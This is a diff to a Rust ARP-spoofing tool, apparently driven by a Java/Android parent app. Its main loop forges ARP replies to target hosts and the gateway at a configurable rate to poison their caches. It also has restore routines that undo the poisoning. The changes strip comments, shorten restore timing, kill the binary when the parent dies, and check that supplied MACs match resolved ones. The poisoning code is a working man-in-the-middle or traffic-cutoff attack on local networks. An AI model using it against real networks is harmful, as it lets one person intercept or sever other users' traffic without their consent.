@@ -21,7 +21,6 @@ unsafe extern "C" {
 // UTILITIES: Structured Logging
 // ============================================================================
 
-// ✅ FIX 1: Added `*` repetition operator after `$($arg:tt)`
 macro_rules! log_info {
     ($($arg:tt)*) => { eprintln!("[INFO] {}", format_args!($($arg)*)); };
 }
@@ -101,7 +100,7 @@ mod protocol {
             message: message.map(|s| s.to_string()),
             targets, data,
         };
-        // ✅ FIX: Use writeln! to avoid panics on broken pipe
+        
         let mut out = std::io::stdout();
         let _ = writeln!(out, "{}", serde_json::to_string(&resp).unwrap_or_default());
         let _ = out.flush();
@@ -343,7 +342,6 @@ mod engine {
         Err(anyhow!("Timed out resolving MAC"))
     }
 
-    /// ✅ ADAPTIVE RESTORE: Time-based instead of fixed loop count.
     pub fn aggressive_restore(
         sock: &RawSock, ifindex: i32,
         targets: &[(Ipv4Addr, [u8; 6])],
@@ -351,9 +349,9 @@ mod engine {
         our_mac: [u8; 6], our_ip: Ipv4Addr,
     ) {
         if targets.is_empty() { return; }
-
+        
         let total_ms = 1500u64 + (targets.len() as u64 * 150);
-        let total_ms = total_ms.min(8000);
+        let total_ms = total_ms.min(5000);
         let deadline = Instant::now() + Duration::from_millis(total_ms);
 
         log_info!("module=restore event=start targets={} duration_ms={}", targets.len(), total_ms);
@@ -362,21 +360,13 @@ mod engine {
             for (ip, mac) in targets {
                 let restore_target = build_arp_reply_restore(our_mac, *mac, gateway_mac, gateway_ip, *ip);
                 let restore_gateway = build_arp_reply_restore(our_mac, gateway_mac, *mac, *ip, gateway_ip);
-
                 let _ = sock.send_frame(restore_target.as_bytes(), ifindex);
                 let _ = sock.send_frame(restore_gateway.as_bytes(), ifindex);
-
-                // Also send broadcast ARP request for extra reliability
-                let arp_req = build_arp_request(*mac, *ip, gateway_ip);
-                let _ = sock.send_frame(arp_req.as_bytes(), ifindex);
             }
-
             let gratuitous = build_gratuitous_arp(our_mac, our_ip);
             let _ = sock.send_frame(gratuitous.as_bytes(), ifindex);
-
             thread::sleep(Duration::from_millis(25));
         }
-
         log_info!("module=restore event=completed");
     }
 }
@@ -390,27 +380,20 @@ mod engine {
 struct Cli {
     #[command(subcommand)]
     command: Option<CliCommand>,
-
     #[arg(help = "Network interface (e.g., wlan0, eth0)")]
     iface: Option<String>,
-
     #[arg(help = "Gateway IP address")]
     gateway: Option<Ipv4Addr>,
-
     #[arg(long, default_value_t = 10, help = "Packets per second per target (1-100)")]
     rate: u64,
 }
 
 #[derive(Subcommand, Debug)]
 enum CliCommand {
-    /// Standalone restore mode: restores ARP tables and exits
     Restore {
-        #[arg(help = "Network interface")]
-        iface: String,
-        #[arg(help = "Gateway IP")]
-        gateway: Ipv4Addr,
-        #[arg(long, help = "Target IP,MAC pairs (e.g., 192.168.1.50,AA:BB:CC:DD:EE:FF)")]
-        target: Vec<String>,
+        #[arg(help = "Network interface")] iface: String,
+        #[arg(help = "Gateway IP")] gateway: Ipv4Addr,
+        #[arg(long, help = "Target IP,MAC pairs")] target: Vec<String>,
     },
 }
 
@@ -419,43 +402,38 @@ enum CliCommand {
 // ============================================================================
 
 fn main() -> Result<()> {
-    use crate::engine::{aggressive_restore, format_mac, parse_mac, resolve_mac, EngineStats, TargetInfo};
-    use crate::protocol::{send_response, Command, Event, JsonRequest, VERSION};
-    use crate::raw_socket::{get_iface_index, get_iface_ipv4, get_iface_mac, RawSock};
-
     unsafe {
         libc::setvbuf(c_stdout, std::ptr::null_mut(), libc::_IOLBF, 0);
         libc::signal(libc::SIGPIPE, libc::SIG_IGN);
+        
+        // ✅ CRITICAL FIX: If the parent process (Java App) dies (e.g. swiped from recents),
+        // the kernel will automatically send SIGTERM to this Rust binary.
+        // This guarantees we don't keep poisoning the network as an orphan process.
+        libc::prctl(libc::PR_SET_PDEATHSIG, libc::SIGTERM);
     }
 
     let cli = Cli::parse();
 
-    // ✅ Handle standalone restore mode
     if let Some(CliCommand::Restore { iface, gateway, target }) = &cli.command {
-        return standalone_restore(&iface, *gateway, &target);
+        return standalone_restore(iface, *gateway, target);
     }
 
-    // Normal service mode requires iface and gateway
     let iface = cli.iface.ok_or_else(|| anyhow!("Interface required in service mode"))?;
     let gateway = cli.gateway.ok_or_else(|| anyhow!("Gateway required in service mode"))?;
-
     run_service(&iface, gateway, cli.rate)
 }
 
-/// ✅ Standalone restore: can be called independently to restore ARP tables
 fn standalone_restore(iface: &str, gateway: Ipv4Addr, targets_str: &[String]) -> Result<()> {
     use crate::engine::{aggressive_restore, parse_mac, resolve_mac};
     use crate::raw_socket::{get_iface_index, get_iface_ipv4, get_iface_mac, RawSock};
 
     log_info!("module=restore mode=standalone targets={}", targets_str.len());
-
     let ifindex = get_iface_index(iface)?;
     let src_mac = get_iface_mac(iface)?;
     let src_ip = get_iface_ipv4(iface)?;
-
     let stop = Arc::new(AtomicBool::new(false));
     let gateway_mac = resolve_mac(iface, src_mac, src_ip, gateway, ifindex, Duration::from_secs(5), &stop)?;
-
+    
     let mut targets = Vec::new();
     for t in targets_str {
         let parts: Vec<&str> = t.split(',').collect();
@@ -465,23 +443,16 @@ fn standalone_restore(iface: &str, gateway: Ipv4Addr, targets_str: &[String]) ->
             }
         }
     }
-
-    if targets.is_empty() {
-        log_info!("module=restore event=no_targets");
-        return Ok(());
-    }
+    if targets.is_empty() { return Ok(()); }
 
     let sock = RawSock::new(libc::ETH_P_ARP as u16)?;
     sock.bind_to_device(iface)?;
-
     aggressive_restore(&sock, ifindex, &targets, gateway, gateway_mac, src_mac, src_ip);
-
-    log_info!("module=restore event=standalone_complete");
     Ok(())
 }
 
-/// Main service mode
 fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
+    use crate::arp::build_arp_reply;
     use crate::engine::{aggressive_restore, format_mac, parse_mac, resolve_mac, EngineStats, TargetInfo};
     use crate::protocol::{send_response, Command, Event, JsonRequest, VERSION};
     use crate::raw_socket::{get_iface_index, get_iface_ipv4, get_iface_mac, RawSock};
@@ -492,29 +463,21 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
     let stats = Arc::new(EngineStats { start_time: Instant::now(), packets_sent: Arc::new(AtomicU64::new(0)) });
 
     let ifindex = get_iface_index(iface).map_err(|e| {
-        send_response(0, Event::Error, Some("INTERFACE_NOT_FOUND"), None, Some(&e.to_string()), None, None);
-        e
+        send_response(0, Event::Error, Some("INTERFACE_NOT_FOUND"), None, Some(&e.to_string()), None, None); e
     })?;
-
     let src_mac = get_iface_mac(iface).map_err(|e| {
-        send_response(0, Event::Error, Some("INTERFACE_ERROR"), None, Some(&e.to_string()), None, None);
-        e
+        send_response(0, Event::Error, Some("INTERFACE_ERROR"), None, Some(&e.to_string()), None, None); e
     })?;
-
     let src_ip = get_iface_ipv4(iface).map_err(|e| {
-        send_response(0, Event::Error, Some("INTERFACE_ERROR"), None, Some(&e.to_string()), None, None);
-        e
+        send_response(0, Event::Error, Some("INTERFACE_ERROR"), None, Some(&e.to_string()), None, None); e
     })?;
-
     let gateway_mac = {
         let stop_ref = Arc::clone(&stop);
         resolve_mac(iface, src_mac, src_ip, gateway, ifindex, Duration::from_secs(5), &stop_ref)
     }.map_err(|e| {
-        send_response(0, Event::Error, Some("GATEWAY_UNREACHABLE"), None, Some(&e.to_string()), None, None);
-        e
+        send_response(0, Event::Error, Some("GATEWAY_UNREACHABLE"), None, Some(&e.to_string()), None, None); e
     })?;
 
-    // Signal handler
     {
         let running = running.clone();
         let stop = stop.clone();
@@ -529,7 +492,6 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
         });
     }
 
-    // Stdin reader thread
     let (cmd_tx, cmd_rx) = mpsc::channel::<JsonRequest>();
     let running_clone_rx = Arc::clone(&running);
     thread::spawn(move || {
@@ -539,6 +501,7 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
             input.clear();
             match stdin.read_line(&mut input) {
                 Ok(0) | Err(_) => {
+                    log_info!("module=stdin event=eof_or_error");
                     running_clone_rx.store(false, Ordering::SeqCst);
                     break;
                 }
@@ -551,7 +514,6 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
         }
     });
 
-    // Command worker thread
     let targets_clone = Arc::clone(&targets);
     let running_clone_worker = Arc::clone(&running);
     let stop_clone_worker = Arc::clone(&stop);
@@ -579,9 +541,19 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
                                 Err(_) => { send_response(req.id, Event::Error, Some("INVALID_IP"), Some(&ip), Some("Invalid IP"), None, None); continue; }
                             };
                             let target_mac = if let Some(m) = mac {
-                                match parse_mac(&m) {
+                                let provided_mac = match parse_mac(&m) {
                                     Some(m) => m,
                                     None => { send_response(req.id, Event::Error, Some("INVALID_MAC"), Some(&ip), Some("Invalid MAC"), None, None); continue; }
+                                };
+                                match resolve_mac(&iface_clone, src_mac_clone, src_ip_clone, ip_addr, ifindex_clone, Duration::from_secs(3), &stop_clone_worker) {
+                                    Ok(resolved_mac) => {
+                                        if resolved_mac != provided_mac {
+                                            send_response(req.id, Event::Error, Some("MAC_IP_MISMATCH"), Some(&ip), Some("Provided MAC does not match resolved MAC"), None, None);
+                                            continue;
+                                        }
+                                        resolved_mac
+                                    }
+                                    Err(_) => provided_mac,
                                 }
                             } else {
                                 match resolve_mac(&iface_clone, src_mac_clone, src_ip_clone, ip_addr, ifindex_clone, Duration::from_secs(5), &stop_clone_worker) {
@@ -619,7 +591,6 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
                             let mut t = targets_clone.write().unwrap();
                             let mut added = 0; let mut updated = 0;
                             let mut to_remove: Vec<[u8; 6]> = t.keys().copied().collect();
-
                             for target in sync_targets {
                                 let ip_addr: Ipv4Addr = match target.ip.parse() { Ok(i) => i, Err(_) => continue };
                                 let target_mac = match parse_mac(&target.mac) { Some(m) => m, None => continue };
@@ -630,18 +601,13 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
                                     t.insert(target_mac, TargetInfo { ip: ip_addr, mac: target_mac }); added += 1;
                                 }
                             }
-
                             let mut targets_to_restore = Vec::new();
                             for mac in to_remove {
                                 if let Some(info) = t.remove(&mac) { targets_to_restore.push((info.ip, info.mac)); }
                             }
                             drop(t);
-
                             let removed = targets_to_restore.len();
-                            log_info!("module=engine event=sync added={} updated={} removed={}", added, updated, removed);
-
                             if !targets_to_restore.is_empty() {
-                                send_response(req.id, Event::RestoreStarted, None, None, Some(&format!("Restoring {} targets", removed)), None, None);
                                 if let Ok(temp_sock) = RawSock::new(libc::ETH_P_ARP as u16) {
                                     let _ = temp_sock.bind_to_device(&iface_clone);
                                     aggressive_restore(&temp_sock, ifindex_clone, &targets_to_restore, gateway_clone, gateway_mac_clone, src_mac_clone, src_ip_clone);
@@ -666,7 +632,6 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
                                 t.clear(); targets
                             };
                             if !targets_to_restore.is_empty() {
-                                send_response(req.id, Event::RestoreStarted, None, None, Some(&format!("Flushing {} targets", targets_to_restore.len())), None, None);
                                 if let Ok(temp_sock) = RawSock::new(libc::ETH_P_ARP as u16) {
                                     let _ = temp_sock.bind_to_device(&iface_clone);
                                     aggressive_restore(&temp_sock, ifindex_clone, &targets_to_restore, gateway_clone, gateway_mac_clone, src_mac_clone, src_ip_clone);
@@ -683,32 +648,25 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
                             }).collect();
                             send_response(req.id, Event::TargetList, None, None, None, Some(target_list), None);
                         }
-                        // ✅ NEW: RestoreAndQuit - restores all targets and exits
                         Command::RestoreAndQuit => {
                             log_info!("module=engine event=restore_and_quit");
                             let targets_snapshot = {
                                 let mut t = targets_clone.write().unwrap();
                                 let snapshot: Vec<(Ipv4Addr, [u8; 6])> = t.values().map(|info| (info.ip, info.mac)).collect();
-                                t.clear();
-                                snapshot
+                                t.clear(); snapshot
                             };
-
-                            send_response(req.id, Event::RestoreStarted, None, None, Some(&format!("Restoring {} targets", targets_snapshot.len())), None, None);
-
                             if !targets_snapshot.is_empty() {
                                 if let Ok(temp_sock) = RawSock::new(libc::ETH_P_ARP as u16) {
                                     let _ = temp_sock.bind_to_device(&iface_clone);
                                     aggressive_restore(&temp_sock, ifindex_clone, &targets_snapshot, gateway_clone, gateway_mac_clone, src_mac_clone, src_ip_clone);
                                 }
                             }
-
                             send_response(req.id, Event::RestoreCompleted, None, None, Some("Restore complete, shutting down"), None, None);
                             running_clone_worker.store(false, Ordering::SeqCst);
                             stop_clone_worker.store(true, Ordering::Release);
                             break;
                         }
                         Command::Quit => {
-                            log_info!("module=engine event=quit_requested");
                             send_response(req.id, Event::Success, None, None, Some("Shutting down"), None, None);
                             running_clone_worker.store(false, Ordering::SeqCst);
                             stop_clone_worker.store(true, Ordering::Release);
@@ -725,7 +683,6 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
         }
     });
 
-    // Main poisoning loop
     let rate = rate.clamp(1, 100);
     let interval = Duration::from_millis(1000 / rate);
     let sock = RawSock::new(libc::ETH_P_ARP as u16)?;
@@ -741,7 +698,6 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
 
     while running.load(Ordering::SeqCst) {
         if stop.load(Ordering::Acquire) { break; }
-
         if last_integrity_check.elapsed() >= integrity_check_interval {
             if let Ok(current_ip) = get_iface_ipv4(iface) {
                 if current_ip != src_ip {
@@ -768,11 +724,10 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
 
         let snapshot_len = targets_snapshot.len();
         let mut any_success = false;
-
         for (ip, mac) in targets_snapshot {
-            let poison_target = crate::arp::build_arp_reply(src_mac, mac, gateway, ip);
+            let poison_target = build_arp_reply(src_mac, mac, gateway, ip);
             if sock.send_frame(poison_target.as_bytes(), ifindex).is_ok() { any_success = true; }
-            let poison_gateway = crate::arp::build_arp_reply(src_mac, gateway_mac, ip, gateway);
+            let poison_gateway = build_arp_reply(src_mac, gateway_mac, ip, gateway);
             if sock.send_frame(poison_gateway.as_bytes(), ifindex).is_ok() { any_success = true; }
         }
 
@@ -786,16 +741,13 @@ fn run_service(iface: &str, gateway: Ipv4Addr, rate: u64) -> Result<()> {
                 break;
             }
         }
-
         thread::sleep(interval);
     }
 
-    // ✅ Final restore on exit (safety net)
     let targets_snapshot = {
         let mut t = targets.write().unwrap();
         let targets: Vec<(Ipv4Addr, [u8; 6])> = t.values().map(|info| (info.ip, info.mac)).collect();
-        t.clear();
-        targets
+        t.clear(); targets
     };
 
     if !targets_snapshot.is_empty() {
